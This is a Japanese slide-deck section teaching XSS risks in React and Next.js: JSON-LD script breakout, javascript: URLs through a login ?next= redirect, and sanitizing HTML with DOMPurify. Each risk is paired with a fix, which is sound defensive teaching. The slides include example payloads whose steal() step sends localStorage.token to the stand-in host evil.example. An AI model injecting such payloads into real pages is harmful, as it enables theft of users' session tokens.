---
layout: section
routeAlias: dangerous-code
style: "--accent: var(--green)"
---

<div class="section-num">02</div>

# 危険なコード

<div class="section-sub">Reactがエスケープするもの、そしてそれを迂回する避難ハッチ</div>

---

# JSONでさえ外に飛び出せる

<div class="sub">検索エンジン向けの構造化データ（JSON-LD）。Next.jsのドキュメント通り、サーバー側でレンダリングする</div>

```jsx
const jsonLd = { name: product.name, description: product.description }
<script type="application/ld+json"
  dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }} />
```

<div class="cols json-cols">
<div>

<div class="note">ある出品者が、この商品説明を保存する：</div>

```html
</script><img src=x onerror=steal()>
```

<div v-click="4" class="card lit json-fix">
<div class="col-h ok"><lucide-check /> 同じドキュメントにある対策</div>

```js
JSON.stringify(jsonLd).replace(/</g, '\\u003c')
```

</div>
</div>
<div>

<ol class="json-steps">
  <li v-click="1"><b>引用符はエスケープされるが、<code>&lt;</code>はされない</b>：JSON.stringifyはJSON用にエスケープするだけで、HTML用ではない</li>
  <li v-click="2"><b>HTMLパーサーはJSONを読まない</b>：最初に見つけた<code>&lt;/script&gt;</code>でscriptタグが終わる</li>
  <li v-click="3"><b>その後はページのHTMLとして解釈される</b>：<code>&lt;img&gt;</code>が失敗して<code>onerror</code>が実行され、ページには取り残された<code>"}</code>だけが表示される</li>
</ol>

</div>
</div>

<div v-click="5" class="punch">その文字列を読むパーサーごとに、それぞれのエスケープが必要</div>

<div class="foot"><lucide-info /> <b>steal()</b>はフックのコードの代わり：localStorage.tokenを読み、evil.exampleへ送る</div>

<div class="source"><lucide-link /><a href="https://nextjs.org/docs/app/guides/json-ld" target="_blank">Next.js：JSON-LD（「JSON.stringify … does not sanitize malicious strings」）</a></div>

<style>
.json-cols { margin-top: 0.4rem; }
.json-fix { margin-top: 0.6rem; padding: 0.5rem 0.9rem; }
.json-steps { font-size: 0.85rem; margin-top: 0.8rem; }
.json-steps li { margin: 0.5rem 0; line-height: 1.45; }
.json-steps b { color: var(--orange); }
</style>

---

# 再現：JSON-LDの飛び出し <span class="badge" style="--c: var(--red)">デモ</span>

<div class="sub">同じ商品ページを、サーバーが送る形、ブラウザが解釈する形、ユーザーに見える形で</div>

<JsonLdScheme />

<div class="pills"><DemoLink href="demos/jsonld.html">JSON.stringify</DemoLink><DemoLink href="demos/jsonld-fixed.html">エスケープあり</DemoLink></div>

<div class="foot"><lucide-search /> デモページで、<b>View Source</b>（ページのソース）とDevTools → <b>Elements</b>を見比べる。Networkにevil.exampleへのリクエストが出る</div>

---

# URLもコードになりうる

<MdnLink path="Web/URI/Reference/Schemes/javascript">javascript: URLは、ブラウザがそこへ遷移するとその文字列をコードとして実行する</MdnLink>

<div class="note">攻撃者がユーザーに、あなたのログインページへのリンクを送る。サインイン後、あなたのコードは<code>?next=</code>へ遷移する</div>

<div class="cols">
<div class="card">
<div class="col-h ng"><lucide-x /> 自分のコードで遷移する</div>

```js
// /login?next=javascript:steal()
const next = searchParams.get('next')
location.href = next // steal()が実行される
```

</div>
<div class="card lit">
<div class="col-h ok"><lucide-check /> 自分のオリジンだけ許可する</div>

```js
const url = new URL(next, location.origin)
if (url.origin === location.origin) {
  location.href = url.href
}
```

</div>
</div>

- **React 19はJSXを守る**：`href`と`src`の`javascript:`をブロックする（React 18は警告のみ）
- **Next.js 16.2以降はrouterを守る**：`router.push`は例外を投げ、Server Actionのリダイレクトもブロックされる
- **ブラウザのAPIには防御がない**：`location.href`、`window.open`
- **同じチェックでオープンリダイレクトも防げる**：`?next=https://evil.example`も拒否される

<div class="source"><lucide-link /><a href="https://react.dev/blog/2024/04/25/react-19-upgrade-guide" target="_blank">React 19アップグレードガイド</a> · <a href="https://github.com/vercel/next.js/pull/88185" target="_blank">Next.js #88185：routerのメソッドとリダイレクトでjavascript URLを禁止</a></div>

<style>
.cols { margin-top: 0.7rem; }
.cols + ul { margin-top: 0.7rem; }
.cols + ul li { margin: 0.3rem 0; }
.cols .card pre, .cols .card .slidev-code { font-size: 0.72rem !important; }
</style>

---

# 再現：?next=に仕込んだjavascript: <span class="badge" style="--c: var(--red)">デモ</span>

<div class="sub">同じリンクで両方のページを開く：<code>login.html?next=javascript:steal()</code>、そして「続ける」を押す</div>

<div class="cols">
<div>

<div class="col-h ng"><lucide-x /> location.href = next</div>

<div class="devtools">
<div class="dt-h">DevTools → Network</div>
<div class="dt-row ng">GET https://evil.example/?t=demo-token-not-a-secret</div>
<div class="dt-row">(failed) net::ERR_NAME_NOT_RESOLVED</div>
</div>

</div>
<div>

<div class="col-h ok"><lucide-check /> まずオリジンをチェック</div>

<div class="devtools">
<div class="dt-h">ページ上</div>
<div class="dt-row ok">Refused: javascript:steal() is not on https://…</div>
</div>

</div>
</div>

<div class="pills"><DemoLink href="demos/login.html?next=javascript:steal()">チェックなし</DemoLink><DemoLink href="demos/login-fixed.html?next=javascript:steal()">チェックあり</DemoLink></div>

<div class="foot"><lucide-flask-conical /> デモページはダミーのトークンを<b>evil.example</b>（名前解決されない予約ドメイン）に送る。ブラウザの外には何も出ない</div>

---

# どうしてもHTMLが必要なとき：サニタイズ

<div class="sub">サニタイザーは書式を残し、実行されうるものをすべて取り除く</div>

```jsx {4-5}
import DOMPurify from 'dompurify'

function Post({ post }) {
  const clean = DOMPurify.sanitize(post.body) // フックのペイロード → <img src="x">
  return <article dangerouslySetInnerHTML={{ __html: clean }} />
}
```

- **メンテナンスされたサニタイザーを使う**：安全なタグだけを残す。DOMPurify、`rehype-sanitize`
- **レンダリングの直前にサニタイズする**：`__html`に渡るHTMLが、チェック済みのHTMLになる
- **自作しない、更新し続ける**：正規表現は漏れるし、新しい回避手段が現れる
- **使うMarkdownライブラリを把握する**：`marked`はサニタイズしない。`react-markdown`は標準で無効化（`rehype-raw`で有効化）
- **ブラウザ標準も近い**：`Element.setHTML()`がネイティブにサニタイズ。まだ全主要ブラウザ未対応（Baseline、2026.11時点）

<div class="source"><lucide-link /><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank">OWASP：XSSの防止</a> · <a href="https://github.com/cure53/DOMPurify" target="_blank">DOMPurify</a> · <a href="https://developer.mozilla.org/ja/docs/Web/API/Element/setHTML" target="_blank">MDN：Element.setHTML()（限定的なサポート、2026.11時点）</a> · <a href="https://marked.js.org/" target="_blank">marked</a> · <a href="https://github.com/remarkjs/react-markdown#security" target="_blank">react-markdown：セキュリティ</a></div>

<style>
ul li { font-size: 0.92rem; line-height: 1.55; margin: 0.5rem 0; }
</style>

---

# 再現：フックをサニタイズする <span class="badge" style="--c: var(--red)">デモ</span>

<div class="sub">フックの投稿本文を、<code>DOMPurify.sanitize</code>ありとなしで</div>

<div class="cols">
<div>

<div class="col-h ng"><lucide-x /> そのまま</div>

<div class="devtools">
<div class="dt-h">DevTools → Elements</div>
<div class="dt-row">&lt;img src="x" onerror="const t = localStorage.token …"&gt;</div>
</div>

<div class="devtools">
<div class="dt-h">DevTools → Network</div>
<div class="dt-row ng">GET https://evil.example/?t=demo-token-not-a-secret</div>
<div class="dt-row">(failed) net::ERR_NAME_NOT_RESOLVED</div>
</div>

</div>
<div>

<div class="col-h ok"><lucide-check /> サニタイズ後</div>

<div class="devtools">
<div class="dt-h">DevTools → Elements</div>
<div class="dt-row ok">&lt;img src="x"&gt;</div>
</div>

<div class="devtools">
<div class="dt-h">DevTools → Network</div>
<div class="dt-row ok">evil.exampleへのリクエストなし</div>
</div>

</div>
</div>

<div class="pills"><DemoLink href="demos/hook.html">そのまま</DemoLink><DemoLink href="demos/sanitize.html">サニタイズ後</DemoLink></div>

<div class="foot"><lucide-flask-conical /> デモページはダミーのトークンを<b>evil.example</b>（名前解決されない予約ドメイン）に送る。ブラウザの外には何も出ない</div>

---
routeAlias: dangerous-takeaway
---

# Reactはテキストをエスケープする。あとは自分の仕事

<div class="sub">文字列が別のものに変わるときは、それがどこから来たか確認する</div>

<div class="cheat">

| 何になるか | 危険なAPI | 代わりにこうする |
|---|---|---|
| HTML | `dangerouslySetInnerHTML`、`innerHTML` | JSXのテキストとして描画する。HTMLが必要ならまずサニタイズする |
| コード | `eval`、`new Function`、`setTimeout('…')` | データでは絶対に使わない。関数を渡し、JSONは`JSON.parse`で読む |
| URL | `location.href = …`、`window.open(…)` | `new URL`で解析し、自分のオリジンか決め打ちのホスト一覧だけを許可する |

</div>

<div class="punch">避難ハッチはどれも、エスケープが自分の仕事になる場所</div>

<div class="foot"><lucide-search /> コードベースで見つけるには：<b>dangerouslySetInnerHTML</b>、<b>innerHTML</b>、<b>eval(</b>、<b>location.href</b>、<b>window.open</b>を検索する</div>

<div class="bridge">ライブラリはこうした選択の一部を代わりに行う → <b>自分が書いていないコード</b></div>

<style>
.cheat table { font-size: 0.95rem; margin-top: 1rem; }
.cheat th, .cheat td { padding: 0.65rem 0.7rem !important; }
.cheat td:first-child { white-space: nowrap; font-weight: bold; }
</style>
